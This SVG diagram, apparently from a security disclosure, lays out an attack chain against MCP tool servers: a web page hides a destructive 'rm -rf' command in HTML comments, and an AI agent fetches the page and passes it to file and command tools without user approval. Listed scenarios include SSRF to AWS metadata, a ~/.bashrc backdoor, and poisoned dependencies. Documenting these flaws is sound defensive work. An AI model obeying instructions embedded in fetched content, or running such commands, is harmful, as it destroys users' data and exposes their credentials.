<?xml version="1.0" encoding="UTF-8"?>
<svg width="1400" height="900" xmlns="http://www.w3.org/2000/svg">
  <!-- Background -->
  <rect width="1400" height="900" fill="#0f172a"/>

  <!-- Grid pattern -->
  <defs>
    <pattern id="grid" width="40" height="40" patternUnits="userSpaceOnUse">
      <path d="M 40 0 L 0 0 0 40" fill="none" stroke="#1e293b" stroke-width="0.5" opacity="0.2"/>
    </pattern>

    <!-- Arrow marker -->
    <marker id="arrowred" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
      <path d="M0,0 L0,6 L9,3 z" fill="#ef4444" />
    </marker>

    <marker id="arrowyellow" markerWidth="10" markerHeight="10" refX="9" refY="3" orient="auto" markerUnits="strokeWidth">
      <path d="M0,0 L0,6 L9,3 z" fill="#f59e0b" />
    </marker>
  </defs>
  <rect width="1400" height="900" fill="url(#grid)"/>

  <!-- Title -->
  <text x="700" y="50" font-family="Arial, sans-serif" font-size="32" font-weight="bold" fill="#ffffff" text-anchor="middle">
    MCP Attack Chain Architecture
  </text>
  <text x="700" y="80" font-family="Arial, sans-serif" font-size="16" fill="#94a3b8" text-anchor="middle">
    Multi-Server Exploit Flow | CVSS 8.6 (HIGH)
  </text>

  <!-- PHASE 1: Attack Preparation -->
  <text x="50" y="140" font-family="Arial, sans-serif" font-size="18" font-weight="bold" fill="#60a5fa">
    PHASE 1: PREPARATION
  </text>
  <rect x="50" y="150" width="300" height="120" fill="#1e293b" stroke="#3b82f6" stroke-width="2" rx="8"/>
  <text x="200" y="180" font-family="Arial, sans-serif" font-size="16" font-weight="bold" fill="#ffffff" text-anchor="middle">
    Attacker Infrastructure
  </text>
  <text x="70" y="210" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • Malicious HTML page hosted
  </text>
  <text x="70" y="230" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • Commands hidden in HTML comments
  </text>
  <text x="70" y="250" font-family="Arial, sans-serif" font-size="13" fill="#fbbf24">
    • &lt;!-- ```bash rm -rf /important``` --&gt;
  </text>

  <!-- PHASE 2: Social Engineering -->
  <text x="450" y="140" font-family="Arial, sans-serif" font-size="18" font-weight="bold" fill="#60a5fa">
    PHASE 2: SOCIAL ENGINEERING
  </text>
  <rect x="450" y="150" width="300" height="120" fill="#1e293b" stroke="#3b82f6" stroke-width="2" rx="8"/>
  <text x="600" y="180" font-family="Arial, sans-serif" font-size="16" font-weight="bold" fill="#ffffff" text-anchor="middle">
    User Interaction
  </text>
  <text x="470" y="210" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    User asks AI:
  </text>
  <text x="470" y="230" font-family="Arial, sans-serif" font-size="13" fill="#fbbf24">
    "Fetch the setup guide from
  </text>
  <text x="470" y="250" font-family="Arial, sans-serif" font-size="13" fill="#fbbf24">
     https://attacker.com/docs.html"
  </text>

  <!-- PHASE 3: Exploit Chain -->
  <text x="850" y="140" font-family="Arial, sans-serif" font-size="18" font-weight="bold" fill="#ef4444">
    PHASE 3: EXPLOIT CHAIN
  </text>

  <!-- Step 1: AI Request -->
  <rect x="850" y="160" width="250" height="80" fill="#dc2626" fill-opacity="0.1" stroke="#dc2626" stroke-width="2" rx="6"/>
  <text x="975" y="185" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#ffffff" text-anchor="middle">
    Step 1: AI Agent
  </text>
  <text x="870" y="210" font-family="Arial, sans-serif" font-size="12" fill="#fca5a5">
    Receives user prompt
  </text>
  <text x="870" y="228" font-family="Arial, sans-serif" font-size="12" fill="#fca5a5">
    Calls fetch_url(attacker.com/docs.html)
  </text>

  <!-- Step 2: Fetch Server -->
  <rect x="850" y="270" width="250" height="100" fill="#dc2626" fill-opacity="0.1" stroke="#dc2626" stroke-width="2" rx="6"/>
  <text x="975" y="295" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#ffffff" text-anchor="middle">
    Step 2: Fetch Server (SSRF)
  </text>
  <text x="870" y="315" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    ❌ No URL validation
  </text>
  <text x="870" y="332" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    Retrieves HTML from attacker
  </text>
  <text x="870" y="349" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    Processes with markdownify
  </text>
  <text x="870" y="363" font-family="Arial, sans-serif" font-size="10" fill="#f59e0b">
    server.py:41-45
  </text>

  <!-- Step 3: HTML Processing -->
  <rect x="850" y="400" width="250" height="100" fill="#dc2626" fill-opacity="0.1" stroke="#dc2626" stroke-width="2" rx="6"/>
  <text x="975" y="425" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#ffffff" text-anchor="middle">
    Step 3: Content Extraction
  </text>
  <text x="870" y="445" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    ❌ HTML comments NOT sanitized
  </text>
  <text x="870" y="462" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    markdownify preserves comments
  </text>
  <text x="870" y="479" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    Commands extracted from comments
  </text>
  <text x="870" y="493" font-family="Arial, sans-serif" font-size="10" fill="#f59e0b">
    CWE-79: Improper Neutralization
  </text>

  <!-- Step 4: Filesystem Server -->
  <rect x="850" y="530" width="250" height="100" fill="#dc2626" fill-opacity="0.1" stroke="#dc2626" stroke-width="2" rx="6"/>
  <text x="975" y="555" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#ffffff" text-anchor="middle">
    Step 4: Filesystem Server
  </text>
  <text x="870" y="575" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    ❌ No user approval required
  </text>
  <text x="870" y="592" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    Executes write_file() directly
  </text>
  <text x="870" y="609" font-family="Arial, sans-serif" font-size="11" fill="#fca5a5">
    Or execute_command()
  </text>
  <text x="870" y="623" font-family="Arial, sans-serif" font-size="10" fill="#f59e0b">
    CWE-862: Missing Authorization
  </text>

  <!-- Step 5: Compromise -->
  <rect x="850" y="660" width="250" height="80" fill="#dc2626" fill-opacity="0.2" stroke="#dc2626" stroke-width="3" rx="6"/>
  <text x="975" y="685" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#ef4444" text-anchor="middle">
    Step 5: SYSTEM COMPROMISED
  </text>
  <text x="870" y="710" font-family="Arial, sans-serif" font-size="12" fill="#fca5a5">
    • Arbitrary file writes
  </text>
  <text x="870" y="728" font-family="Arial, sans-serif" font-size="12" fill="#fca5a5">
    • Remote code execution
  </text>

  <!-- Attack Flow Arrows -->
  <line x1="200" y1="270" x2="600" y2="170" stroke="#3b82f6" stroke-width="2" marker-end="url(#arrowyellow)"/>
  <line x1="600" y1="270" x2="975" y2="160" stroke="#f59e0b" stroke-width="2" marker-end="url(#arrowred)"/>
  <line x1="975" y1="240" x2="975" y2="270" stroke="#ef4444" stroke-width="3" marker-end="url(#arrowred)"/>
  <line x1="975" y1="370" x2="975" y2="400" stroke="#ef4444" stroke-width="3" marker-end="url(#arrowred)"/>
  <line x1="975" y1="500" x2="975" y2="530" stroke="#ef4444" stroke-width="3" marker-end="url(#arrowred)"/>
  <line x1="975" y1="630" x2="975" y2="660" stroke="#ef4444" stroke-width="3" marker-end="url(#arrowred)"/>

  <!-- IMPACT BOX -->
  <rect x="50" y="320" width="700" height="420" fill="#7c2d12" fill-opacity="0.1" stroke="#ea580c" stroke-width="2" rx="8"/>
  <text x="400" y="350" font-family="Arial, sans-serif" font-size="18" font-weight="bold" fill="#fb923c" text-anchor="middle">
    REAL-WORLD IMPACT SCENARIOS
  </text>

  <!-- Impact 1 -->
  <rect x="70" y="370" width="320" height="100" fill="#1e293b" stroke="#f97316" stroke-width="1" rx="6"/>
  <text x="230" y="395" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#fb923c" text-anchor="middle">
    Scenario A: AWS Credential Theft
  </text>
  <text x="85" y="415" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    1. SSRF to 169.254.169.254 (AWS metadata)
  </text>
  <text x="85" y="432" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    2. Retrieve IAM role credentials
  </text>
  <text x="85" y="449" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    3. Full AWS account takeover
  </text>
  <text x="85" y="464" font-family="Arial, sans-serif" font-size="10" font-weight="bold" fill="#ef4444">
    Impact: CRITICAL
  </text>

  <!-- Impact 2 -->
  <rect x="410" y="370" width="320" height="100" fill="#1e293b" stroke="#f97316" stroke-width="1" rx="6"/>
  <text x="570" y="395" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#fb923c" text-anchor="middle">
    Scenario B: Persistent Backdoor
  </text>
  <text x="425" y="415" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    1. Write malicious code to ~/.bashrc
  </text>
  <text x="425" y="432" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    2. Executes on every shell launch
  </text>
  <text x="425" y="449" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    3. Permanent system compromise
  </text>
  <text x="425" y="464" font-family="Arial, sans-serif" font-size="10" font-weight="bold" fill="#ef4444">
    Impact: CRITICAL
  </text>

  <!-- Impact 3 -->
  <rect x="70" y="490" width="320" height="100" fill="#1e293b" stroke="#f97316" stroke-width="1" rx="6"/>
  <text x="230" y="515" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#fb923c" text-anchor="middle">
    Scenario C: Data Exfiltration
  </text>
  <text x="85" y="535" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    1. JQL injection bypasses project filters
  </text>
  <text x="85" y="552" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    2. Access confidential issues
  </text>
  <text x="85" y="569" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    3. Sensitive data leaked
  </text>
  <text x="85" y="584" font-family="Arial, sans-serif" font-size="10" font-weight="bold" fill="#f59e0b">
    Impact: HIGH
  </text>

  <!-- Impact 4 -->
  <rect x="410" y="490" width="320" height="100" fill="#1e293b" stroke="#f97316" stroke-width="1" rx="6"/>
  <text x="570" y="515" font-family="Arial, sans-serif" font-size="14" font-weight="bold" fill="#fb923c" text-anchor="middle">
    Scenario D: Supply Chain Attack
  </text>
  <text x="425" y="535" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    1. Poison package.json dependencies
  </text>
  <text x="425" y="552" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    2. npm install executes malicious code
  </text>
  <text x="425" y="569" font-family="Arial, sans-serif" font-size="11" fill="#cbd5e1">
    3. Development environment compromised
  </text>
  <text x="425" y="584" font-family="Arial, sans-serif" font-size="10" font-weight="bold" fill="#f59e0b">
    Impact: HIGH
  </text>

  <!-- Statistics -->
  <rect x="70" y="610" width="660" height="110" fill="#1e293b" stroke="#3b82f6" stroke-width="2" rx="6"/>
  <text x="400" y="640" font-family="Arial, sans-serif" font-size="16" font-weight="bold" fill="#60a5fa" text-anchor="middle">
    VULNERABILITY STATISTICS
  </text>

  <text x="100" y="670" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • Servers Analyzed: 5
  </text>
  <text x="100" y="690" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • Vulnerable: 5/5 (100%)
  </text>
  <text x="100" y="710" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • Missing Provenance: 100%
  </text>

  <text x="400" y="670" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • Missing User Approval: 100%
  </text>
  <text x="400" y="690" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • SSRF Vulnerabilities: 40%
  </text>
  <text x="400" y="710" font-family="Arial, sans-serif" font-size="13" fill="#e2e8f0">
    • Confirmed RCE Chain: Yes
  </text>

  <!-- KEY TAKEAWAY -->
  <rect x="50" y="780" width="1300" height="80" fill="#7c2d12" fill-opacity="0.2" stroke="#dc2626" stroke-width="3" rx="8"/>
  <text x="700" y="810" font-family="Arial, sans-serif" font-size="18" font-weight="bold" fill="#fca5a5" text-anchor="middle">
    KEY FINDING: This is a SYSTEMIC problem, not isolated bugs
  </text>
  <text x="700" y="838" font-family="Arial, sans-serif" font-size="14" fill="#cbd5e1" text-anchor="middle">
    The MCP protocol specification lacks mandatory security requirements, leading to consistent vulnerabilities across ALL analyzed servers
  </text>

  <!-- Footer -->
  <text x="50" y="880" font-family="Arial, sans-serif" font-size="12" fill="#64748b">
    Research: Independent Security Analysis | Coordinated Disclosure: 90 Days | CVSS: 6.5 - 8.6 (MEDIUM to HIGH)
  </text>
  <text x="1350" y="880" font-family="Arial, sans-serif" font-size="12" font-weight="bold" fill="#94a3b8" text-anchor="end">
    Full Report: github.com/[repo]/mcp-security-research
  </text>
</svg>
